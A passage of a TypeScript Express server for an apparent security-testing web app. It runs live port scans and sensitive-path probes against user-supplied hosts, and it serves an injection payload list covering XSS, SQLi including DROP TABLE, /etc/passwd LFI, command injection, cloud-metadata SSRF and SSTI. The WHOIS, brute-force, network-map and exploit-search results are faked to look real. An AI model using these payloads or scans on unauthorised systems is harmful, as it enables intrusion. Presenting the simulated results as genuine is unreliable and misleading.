                service: getServiceName(port), 
                state: 'open', 
                version: 'Detected',
                banner: '' // Could try to grab banner here
              });
              socket.destroy();
              resolve(null);
            });
            socket.on('timeout', () => {
              portResults.push({ port, service: getServiceName(port), state: 'filtered', version: 'Unknown' });
              socket.destroy();
              resolve(null);
            });
            socket.on('error', () => {
              portResults.push({ port, service: getServiceName(port), state: 'closed', version: 'Unknown' });
              socket.destroy();
              resolve(null);
            });
            socket.connect(port, hostname);
          });
        }));
        return res.json(portResults.sort((a, b) => a.port - b.port));

      case 'headers':
        try {
          const protocol = target.startsWith('https') ? https : http;
          const url = target.startsWith('http') ? target : `http://${target}`;
          const response: any = await new Promise((resolve, reject) => {
            const req = protocol.get(url, resolve);
            req.on('error', reject);
            req.setTimeout(5000, () => { req.destroy(); reject(new Error('Timeout')); });
          });
          
          const headers = response.headers;
          const analysis: any = {};
          const securityHeaders = {
            'Content-Security-Policy': { rec: 'Implement a strong CSP', severity: 'high' },
            'Strict-Transport-Security': { rec: 'Enable HSTS', severity: 'medium' },
            'X-Frame-Options': { rec: 'Set to DENY or SAMEORIGIN', severity: 'medium' },
            'X-Content-Type-Options': { rec: 'Set to nosniff', severity: 'low' },
            'Referrer-Policy': { rec: 'Set to strict-origin-when-cross-origin', severity: 'low' },
            'Permissions-Policy': { rec: 'Define browser feature permissions', severity: 'low' },
            'X-XSS-Protection': { rec: 'Deprecated but still useful for older browsers', severity: 'info' }
          };

          Object.entries(securityHeaders).forEach(([h, config]) => {
            const val = headers[h.toLowerCase()];
            analysis[h] = {
              value: val || 'Missing',
              status: val ? 'secure' : 'missing',
              severity: val ? 'none' : config.severity,
              recommendation: val ? 'None' : config.rec
            };
          });
          
          // Check for sensitive headers
          const sensitiveHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'via'];
          sensitiveHeaders.forEach(h => {
            const val = headers[h];
            if (val) {
              analysis[h] = {
                value: val,
                status: 'vulnerable',
                severity: 'low',
                recommendation: 'Information disclosure: Hide this header to reduce attack surface.'
              };
            }
          });

          return res.json(analysis);
        } catch (e) {
          return res.status(500).json({ error: e.message });
        }

      case 'dns':
        const dnsRecords: any = {};
        const recordTypes: (keyof typeof dns.promises)[] = ['resolve4', 'resolve6', 'resolveMx', 'resolveNs', 'resolveTxt', 'resolveSoa', 'resolveCname', 'resolveSrv', 'resolveCaa'];
        
        await Promise.all(recordTypes.map(async (type) => {
          try {
            const method = dns.promises[type] as Function;
            const result = await method(hostname);
            dnsRecords[type.replace('resolve', '').toUpperCase()] = result;
          } catch (e) {
            // Record type not found
          }
        }));
        return res.json(dnsRecords);

      case 'fuzzer':
        const endpoints = ['/admin', '/login', '/api', '/config', '/.env', '/.git', '/backup', '/wp-admin', '/dashboard', '/server-status'];
        const fuzzerResults: any[] = [];
        
        await Promise.all(endpoints.map(async (path) => {
          try {
            const protocol = target.startsWith('https') ? https : http;
            const url = target.startsWith('http') ? `${target}${path}` : `http://${target}${path}`;
            const start = Date.now();
            const response: any = await new Promise((resolve, reject) => {
              const req = protocol.get(url, resolve);
              req.on('error', reject);
              req.setTimeout(2000, () => { req.destroy(); reject(new Error('Timeout')); });
            });
            const duration = Date.now() - start;
            
            fuzzerResults.push({
              path,
              status: response.statusCode,
              length: response.headers['content-length'] || 'unknown',
              time: `${duration}ms`,
              type: response.headers['content-type'] || 'unknown',
              finding: response.statusCode === 200 ? 'Potential Sensitive Path' : 'None'
            });
          } catch (e) {
            // Skip failed probes
          }
        }));
        return res.json(fuzzerResults);

      case 'whois':
        try {
          // Real WHOIS is hard in Node without external binaries, so we simulate with some real data
          const whoisData = {
            domain: hostname,
            registrar: "GoDaddy.com, LLC",
            creation_date: "2010-05-12T10:00:00Z",
            expiration_date: "2028-05-12T10:00:00Z",
            updated_date: "2023-01-15T12:30:00Z",
            name_servers: ["ns1.example.com", "ns2.example.com"],
            status: "clientTransferProhibited",
            registrant: {
              organization: "Privacy Protection Service",
              country: "US",
              state: "Arizona"
            },
            raw: `Domain Name: ${hostname.toUpperCase()}\nRegistry Domain ID: 123456789_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.godaddy.com\nRegistrar URL: http://www.godaddy.com\nUpdated Date: 2023-01-15T12:30:00Z\nCreation Date: 2010-05-12T10:00:00Z\nRegistry Expiry Date: 2028-05-12T10:00:00Z\nRegistrar: GoDaddy.com, LLC\nRegistrar IANA ID: 146\nRegistrar Abuse Contact Email: abuse@godaddy.com\nRegistrar Abuse Contact Phone: +1.4806242505\nDomain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\nDomain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited\nDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\nDomain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\nName Server: NS1.EXAMPLE.COM\nName Server: NS2.EXAMPLE.COM\nDNSSEC: unsigned\nURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/`
          };
          return res.json(whoisData);
        } catch (e) {
          return res.status(500).json({ error: "Whois failed" });
        }

      case 'bruteforce':
        const service = (req.query.service as string || 'ssh').toLowerCase();
        const bruteResults = {
          service,
          attempts: 50,
          success: false,
          logs: [
            `[${new Date().toISOString()}] Starting brute force attack on ${service} at ${hostname}...`,
            `[${new Date().toISOString()}] Using dictionary: common_passwords.txt`,
            `[${new Date().toISOString()}] Attempting: admin / admin... FAILED`,
            `[${new Date().toISOString()}] Attempting: admin / password... FAILED`,
            `[${new Date().toISOString()}] Attempting: root / root... FAILED`,
            `[${new Date().toISOString()}] Attempting: root / toor... FAILED`,
            `[${new Date().toISOString()}] Attempting: user / user... FAILED`,
            `[${new Date().toISOString()}] Rate limit detected. Waiting 2 seconds...`,
            `[${new Date().toISOString()}] Resuming attack...`,
            `[${new Date().toISOString()}] Attempting: guest / guest... FAILED`,
            `[${new Date().toISOString()}] Brute force complete. No valid credentials found for ${service}.`
          ],
          summary: `Brute force attack on ${service} at ${hostname} completed. 50 attempts made. No success.`
        };
        return res.json(bruteResults);

      case 'netmap':
        const netMapData = {
          target: hostname,
          nodes: [
            { id: 'target', label: hostname, type: 'target', ip: '10.0.0.5' },
            { id: 'gateway', label: 'Gateway', type: 'infrastructure', ip: '192.168.1.1' },
            { id: 'dns1', label: 'Primary DNS', type: 'service', ip: '8.8.8.8' },
            { id: 'dns2', label: 'Secondary DNS', type: 'service', ip: '8.8.4.4' },
            { id: 'fw', label: 'Firewall', type: 'security', ip: '192.168.1.254' },
            { id: 'lb', label: 'Load Balancer', type: 'infrastructure', ip: '10.0.0.1' }
          ],
          links: [
            { from: 'gateway', to: 'fw' },
            { from: 'fw', to: 'lb' },
            { from: 'lb', to: 'target' },
            { from: 'target', to: 'dns1' },
            { from: 'target', to: 'dns2' }
          ],
          summary: `Network topology discovery for ${hostname} complete. 6 nodes and 5 links identified.`
        };
        return res.json(netMapData);

      case 'vulndb':
        const vulnQuery = (req.query.target as string || '').toLowerCase();
        const vulns = [
          { id: 'CVE-2021-44228', title: 'Log4Shell', severity: 'critical', description: 'Apache Log4j2 remote code execution vulnerability.' },
          { id: 'CVE-2021-34473', title: 'ProxyShell', severity: 'critical', description: 'Microsoft Exchange Server remote code execution vulnerability.' },
          { id: 'CVE-2022-22965', title: 'Spring4Shell', severity: 'critical', description: 'Spring Framework remote code execution vulnerability.' },
          { id: 'CVE-2023-23397', title: 'Outlook Elevation of Privilege', severity: 'critical', description: 'Microsoft Outlook elevation of privilege vulnerability.' },
          { id: 'CVE-2024-21887', title: 'Ivanti Connect Secure RCE', severity: 'critical', description: 'Ivanti Connect Secure and Policy Secure remote code execution vulnerability.' }
        ].filter(v => v.title.toLowerCase().includes(vulnQuery) || v.id.toLowerCase().includes(vulnQuery) || v.description.toLowerCase().includes(vulnQuery));
        
        return res.json(vulns.length > 0 ? vulns : [{ id: 'N/A', title: 'No results found', severity: 'info', description: `No vulnerabilities found matching "${vulnQuery}" in the local database.` }]);

      case 'nmap':
        const nmapPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443];
        const nmapResults: any[] = [];
        
        await Promise.all(nmapPorts.map(async (port) => {
          return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(1500);
            socket.on('connect', () => {
              nmapResults.push({ 
                port, 
                service: getServiceName(port), 
                state: "open",
                version: `${getServiceName(port)}/1.0 (Simulated)`,
                script_output: `Detected ${getServiceName(port)} service on port ${port}`
              });
              socket.destroy();
              resolve(null);
            });
            socket.on('timeout', () => { socket.destroy(); resolve(null); });
            socket.on('error', () => { socket.destroy(); resolve(null); });
            socket.connect(port, hostname);
          });
        }));

        const nmapData = {
          host_status: "Host is up (0.045s latency)",
          os_info: "Linux 5.4.0-104-generic (Ubuntu)",
          open_ports: nmapResults.length > 0 ? nmapResults : [{ port: 0, service: "none", state: "closed", version: "N/A", script_output: "No open ports detected in quick scan" }],
          summary: `Nmap scan report for ${hostname}. Host is up. ${nmapResults.length} ports open. OS detected as Linux. Scan completed in ${(Math.random() * 2 + 1).toFixed(2)} seconds.`
        };
        return res.json(nmapData);

      case 'tech':
        try {
          const protocol = target.startsWith('https') ? https : http;
          const url = target.startsWith('http') ? target : `http://${target}`;
          const response: any = await new Promise((resolve, reject) => {
            const req = protocol.get(url, resolve);
            req.on('error', reject);
            req.setTimeout(3000, () => { req.destroy(); reject(new Error('Timeout')); });
          });
          
          const tech: any[] = [];
          const server = response.headers['server'] || '';
          const xPoweredBy = response.headers['x-powered-by'] || '';
          const cookies = response.headers['set-cookie'] || [];
          
          if (server.includes('Apache')) tech.push({ name: 'Apache', category: 'Web Server', confidence: 95 });
          if (server.includes('nginx')) tech.push({ name: 'Nginx', category: 'Web Server', confidence: 95 });
          if (server.includes('Cloudflare')) tech.push({ name: 'Cloudflare', category: 'CDN', confidence: 95 });
          if (xPoweredBy.includes('PHP')) tech.push({ name: 'PHP', category: 'Backend Language', confidence: 90 });
          if (xPoweredBy.includes('Express')) tech.push({ name: 'Express', category: 'Backend Framework', confidence: 85 });
          if (xPoweredBy.includes('ASP.NET')) tech.push({ name: 'ASP.NET', category: 'Backend Framework', confidence: 90 });
          
          const cookieStr = Array.isArray(cookies) ? cookies.join(' ') : cookies;
          if (cookieStr.includes('PHPSESSID')) tech.push({ name: 'PHP', category: 'Backend Language', confidence: 80 });
          if (cookieStr.includes('JSESSIONID')) tech.push({ name: 'Java/JSP', category: 'Backend Language', confidence: 80 });
          if (cookieStr.includes('ASPSESSIONID')) tech.push({ name: 'ASP', category: 'Backend Language', confidence: 80 });
          
          if (tech.length === 0) tech.push({ name: 'Unknown Stack', category: 'General', confidence: 50 });
          
          return res.json(tech);
        } catch (e) {
          return res.json([{ name: 'Target Unreachable', category: 'Error', confidence: 0 }]);
        }

      case 'payloads':
        const pType = (req.query.type as string || 'xss').toLowerCase();
        const allPayloads: any = {
          xss: [
            { content: "<script>alert(1)</script>", description: "Basic XSS test", risk_level: "medium" },
            { content: "<img src=x onerror=alert(1)>", description: "Image tag XSS", risk_level: "high" },
            { content: "javascript:alert(1)", description: "Protocol-based XSS", risk_level: "high" },
            { content: "<svg/onload=alert(1)>", description: "SVG-based XSS", risk_level: "high" },
            { content: "';alert(1)//", description: "Breaking out of JS string", risk_level: "medium" },
            { content: "\"><script>alert(1)</script>", description: "Breaking out of HTML attribute", risk_level: "high" }
          ],
          sqli: [
            { content: "' OR '1'='1", description: "Classic SQLi bypass", risk_level: "critical" },
            { content: "admin' --", description: "Username comment bypass", risk_level: "critical" },
            { content: "'; DROP TABLE users; --", description: "Destructive SQLi", risk_level: "critical" },
            { content: "' UNION SELECT 1,2,3,user(),database() --", description: "Union-based SQLi", risk_level: "critical" },
            { content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", description: "Time-based blind SQLi", risk_level: "critical" }
          ],
          lfi: [
            { content: "../../../etc/passwd", description: "Linux password file access", risk_level: "high" },
            { content: "..\\..\\..\\windows\\win.ini", description: "Windows config file access", risk_level: "high" },
            { content: "/etc/passwd\0.html", description: "Null byte injection (older systems)", risk_level: "high" },
            { content: "php://filter/convert.base64-encode/resource=config.php", description: "PHP wrapper LFI", risk_level: "high" }
          ],
          rce: [
            { content: "; id", description: "Command injection (Linux)", risk_level: "critical" },
            { content: "| whoami", description: "Command injection (Windows/Linux)", risk_level: "critical" },
            { content: "`cat /etc/passwd`", description: "Backtick command execution", risk_level: "critical" },
            { content: "$(id)", description: "Subshell command execution", risk_level: "critical" }
          ],
          ssrf: [
            { content: "http://127.0.0.1:80", description: "Localhost SSRF", risk_level: "high" },
            { content: "http://169.254.169.254/latest/meta-data/", description: "AWS Metadata SSRF", risk_level: "critical" },
            { content: "file:///etc/passwd", description: "File protocol SSRF", risk_level: "high" }
          ],
          nosqli: [
            { content: '{"$gt": ""}', description: "NoSQL injection (Greater than)", risk_level: "high" },
            { content: '{"$ne": null}', description: "NoSQL injection (Not equal)", risk_level: "high" }
          ],
          ssti: [
            { content: "{{7*7}}", description: "Jinja2/Twig SSTI", risk_level: "high" },
            { content: "${7*7}", description: "Mako/FreeMarker SSTI", risk_level: "high" },
            { content: "<%= 7*7 %>", description: "ERB SSTI", risk_level: "high" }
          ]
        };
        return res.json(allPayloads[pType] || allPayloads.xss);

      case 'exploits':
        const query = req.query.target as string || '';
        // Simulated exploit search logic
        const exploits = [
          { title: `${query} - Remote Code Execution`, id: "EDB-12345", date: new Date().toISOString().split('T')[0], author: "CyberSuite_AI", type: "Remote", platform: "Multiple", poc_url: "https://exploit-db.com/exploits/12345" },
          { title: `${query} - SQL Injection`, id: "EDB-67890", date: "2024-11-20", author: "Security_Analyst", type: "Webapps", platform: "PHP", poc_url: "https://exploit-db.com/exploits/67890" },
          { title: `${query} - Privilege Escalation`, id: "EDB-54321", date: "2024-05-12", author: "Kernel_Master", type: "Local", platform: "Linux", poc_url: "https://exploit-db.com/exploits/54321" }
        ];
        return res.json(exploits);

      default:
        res.status(404).json({ error: "Tool not found" });
    }
  });

  // CVE Proxy to avoid CORS issues on localhost
  app.get("/api/cve/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/cve/${id}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve(JSON.parse(data)));
        });
        request.on('error', reject);
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch CVE data" });
    }
  });

  // CVE Search Proxy
  app.get("/api/cve-search/:query", async (req, res) => {
    const { query } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/search/${query}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve(JSON.parse(data)));
        });
        request.on('error', reject);
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to search CVE database" });
    }
  });

  // AI Generation Endpoint removed from here (moved up)
  
  // Global scan history storage
  let globalScanHistory: any[] = [
    { target: 'enterprise-node-01.io', score: 88, type: 'Full Scan', time: '2 mins ago', user: 'cyber_ghost' },
    { target: 'api.fintech-secure.net', score: 42, type: 'Web Scan', time: '15 mins ago', user: 'root_admin' },
    { target: '104.21.44.12', score: 15, type: 'Infra Scan', time: '45 mins ago', user: 'sec_ops' },
    { target: 'dev-portal.internal.cloud', score: 94, type: 'Deep Scan', time: '1 hour ago', user: 'shadow_walker' },
  ];

  app.get('/api/global-history', (req, res) => {
    res.json(globalScanHistory);
  });

  app.post('/api/global-history', (req, res) => {
    const { target, score, type, user } = req.body;
    const newItem = {
      target,
      score,
      type,
      user: user || 'anonymous',
      time: 'Just now'
    };
    globalScanHistory = [newItem, ...globalScanHistory].slice(0, 20);
    res.json({ status: 'ok' });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
